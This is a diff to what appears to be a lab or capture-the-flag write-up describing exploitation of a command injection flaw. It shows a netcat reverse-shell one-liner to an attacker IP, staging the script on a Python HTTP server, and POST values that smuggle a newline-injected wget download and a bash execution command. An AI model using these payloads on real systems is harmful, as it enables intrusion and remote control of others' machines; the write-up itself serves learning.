@@ -1,4 +1,4 @@
-
+<img width="1208" height="502" alt="image" src="https://github.com/user-attachments/assets/7c994bad-ece0-46c8-b0e0-fdeb769f1a77" />
 <img alt="Zrzut ekranu 2026-09-6 o 16 01 33" src="https://github.com/user-attachments/assets/d23818ff-2343-45ad-9841-8ce3811c91ee" />
 
 ### 📡 Initial Reconnaissance
@@ -135,6 +135,41 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.112.97.123 4444 >/tmp/f
 <img alt="Zrzut ekranu 2026-09-6 o 16 21 14" src="https://github.com/user-attachments/assets/788439a4-6679-4310-8727-38dfa496184c" />
 
 <img alt="Zrzut ekranu 2026-09-6 o 16 24 34" src="https://github.com/user-attachments/assets/030dc890-f191-4468-a708-4c5d6a928512" />
+
+### 🌐 Staging the Payload via Python HTTP Server
+
+To deliver the reverse shell script to the target machine, I created a local file named `shell.sh` using `vim` containing our Netcat payload.
+
+Next, I launched a Python HTTP server to host the payload for easy remote retrieval:
+
+```bash
+vim shell.sh
+python3 -m http.server
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 30 12" src="https://github.com/user-attachments/assets/45152c16-83d5-49ef-92c8-7226dbe3043e" />
+
+### 📥 Downloading the Payload via Command Injection
+
+With our Python web server hosting `shell.sh`, I leveraged the command injection vulnerability to force the target server to fetch the payload using `wget`.
+
+In the Developer Tools request editor, I modified the POST body:
+
+```http
+target=localhost%0A wget http://10.112.97.123:8000/shell.sh
+```
+<img alt="image" src="https://github.com/user-attachments/assets/b40dc619-397a-463c-babd-902fe83811cd" />
+
+### 🚀 Executing the Script & Spawning the Interactive Shell
+
+With `shell.sh` saved on the target machine, the final step was executing the script to trigger the outbound connection back to Penelope.
+
+I injected an execution command into the POST request body:
+
+```http
+target=localhost%0A+/bin/bash+shell.sh
+```
+<img alt="image" src="https://github.com/user-attachments/assets/5a6848b2-9f1e-4493-a864-f41593ddb853" />
+
 
 
 
